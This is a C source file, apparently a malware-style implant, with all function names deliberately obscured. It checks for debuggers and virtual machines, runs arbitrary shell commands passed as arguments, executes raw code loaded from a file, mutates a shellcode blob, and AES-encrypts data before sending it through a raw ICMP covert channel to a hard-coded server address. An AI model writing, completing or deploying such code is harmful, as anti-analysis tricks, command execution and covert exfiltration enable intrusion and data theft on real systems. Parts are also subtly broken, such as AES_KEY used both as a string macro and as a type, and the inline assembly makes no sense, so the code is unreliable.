#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>

#define AES_KEY "0123456789abcdef"
#define SERVER_IP "127.0.0.1"
#define ICMP_PAYLOAD_SIZE 64

void obf1() {
    __asm__ __volatile__ (
        "xor %eax, %eax\n\t"
        "mov $0x1, %eax\n\t"
        "int $0x80\n\t"
        "cmp %eax, %0\n\t"
        "jne obf3\n\t"
        "obf2:\n\t"
        "jmp obf4\n\t"
        "obf3:\n\t"
        "mov $0x1, %eax\n\t"
        "int $0x80\n\t"
        "obf4:\n\t"
    : : "i" (0) : "%eax");
    if (getppid() != 1) exit(1);
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(1);
}

void obf5(unsigned char *a, unsigned char *b, unsigned char *c) {
    AES_KEY enc_key;
    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_set_encrypt_key(b, 128, &enc_key);
    AES_cfb128_encrypt(a, c, strlen((char *)a), &enc_key, iv, NULL, AES_ENCRYPT);
}

void obf6(unsigned char *a, unsigned char *b, unsigned char *c) {
    AES_KEY dec_key;
    unsigned char iv[AES_BLOCK_SIZE];
    AES_set_decrypt_key(b, 128, &dec_key);
    AES_cfb128_encrypt(a, c, strlen((char *)a), &dec_key, iv, NULL, AES_DECRYPT);
}

const char* obf7 = "\x53\x61\x6D\x70\x6C\x65";
const char obf8 = 0x20;

char* obf9(const char* a) {
    size_t len = strlen(a);
    char* b = malloc(len + 1);
    for (size_t i = 0; i < len; i++) {
        b[i] = a[i] ^ obf8;
    }
    b[len] = '\0';
    return b;
}

int obf10() {
    FILE *f = fopen("/sys/class/dmi/id/product_name", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "VMware") || strstr(line, "VirtualBox")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    return 0;
}

unsigned short obf11(void *a, int b) {
    unsigned short *buf = a;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; b > 1; b -= 2) sum += *buf++;
    if (b == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void obf12(const char *a, const char *b) {
    int sockfd;
    struct sockaddr_in addr;
    struct icmp icmp_hdr;
    char buffer[ICMP_PAYLOAD_SIZE];
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, a, &addr.sin_addr);
    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.icmp_type = ICMP_ECHO;
    icmp_hdr.icmp_code = 0;
    icmp_hdr.icmp_id = getpid();
    icmp_hdr.icmp_seq = 1;
    icmp_hdr.icmp_cksum = 0;
    memset(buffer, 0, sizeof(buffer));
    strcpy(buffer, b);
    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
    icmp_hdr.icmp_cksum = obf11(buffer, sizeof(buffer));
    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, sizeof(addr)) <= 0) {
        perror("Sendto failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    close(sockfd);
}

void obf13() {
    int sockfd;
    struct sockaddr_in addr;
    char buffer[1024];
    socklen_t addr_len;
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    addr_len = sizeof(addr);
    if (recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addr_len) <= 0) {
        perror("Recvfrom failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    struct icmp *icmp_hdr = (struct icmp*)(buffer + sizeof(struct iphdr));
    if (icmp_hdr->icmp_type == ICMP_ECHOREPLY) {
        printf("Received ICMP ECHO REPLY: %s\n", buffer + sizeof(struct iphdr) + sizeof(struct icmp));
    }
    close(sockfd);
}

void obf14(unsigned char* a, size_t b) {
    srand(time(NULL));
    unsigned char key = rand() % 256;
    for (size_t i = 0; i < b; i++) {
        a[i] = (a[i] ^ key) << 1 | (a[i] ^ key) >> 7;
    }
}

void obf15() {
    FILE *f = fopen("code.bin", "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *code = malloc(size);
    fread(code, 1, size, f);
    fclose(f);
    void (*func)() = (void (*)())code;
    func();
    free(code);
}

// Execute a Shell Command
void obf17(const char* command) {
    system(command);
}

void obf16(const char* a) {
    unsigned char key[16] = AES_KEY;
    unsigned char buffer[64];
    if (strcmp(a, "encrypt") == 0) {
        goto obf18;
    } else if (strcmp(a, "decrypt") == 0) {
        goto obf19;
    } else {
        goto shell_command_label;
    }
obf18:
    {
        unsigned char plaintext[64] = "Sensitive data";
        unsigned char ciphertext[64];
        obf5(plaintext, key, ciphertext);
        printf("Encrypted: %s\n", ciphertext);
        return;
    }
obf19:
    {
        unsigned char ciphertext[64] = "EncryptedData";
        unsigned char plaintext[64];
        obf6(ciphertext, key, plaintext);
        printf("Decrypted: %s\n", plaintext);
        return;
    }
shell_command_label:
    {
        printf("Executing shell command: %s\n", a);
        obf17(a);
        return;
    }
}

int main(int argc, char *argv[]) {
    obf1();
    if (obf10()) {
        printf("Running in a VM. Exiting.\n");
        exit(1);
    }
    if (argc > 1) {
        obf16(argv[1]);
        unsigned char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
        obf14(shellcode, sizeof(shellcode) - 1);
        printf("Mutated Shellcode: ");
        for (size_t i = 0; i < sizeof(shellcode) - 1; i++) {
            printf("\\x%02x", shellcode[i]);
        }
        printf("\n");
        char encrypted_message[ICMP_PAYLOAD_SIZE];
        obf5((unsigned char*)argv[1], (unsigned char*)AES_KEY, (unsigned char*)encrypted_message);
        obf12(SERVER_IP, encrypted_message);
        obf13();
    } else {
        printf("No task provided\n");
    }
    return 0;
}
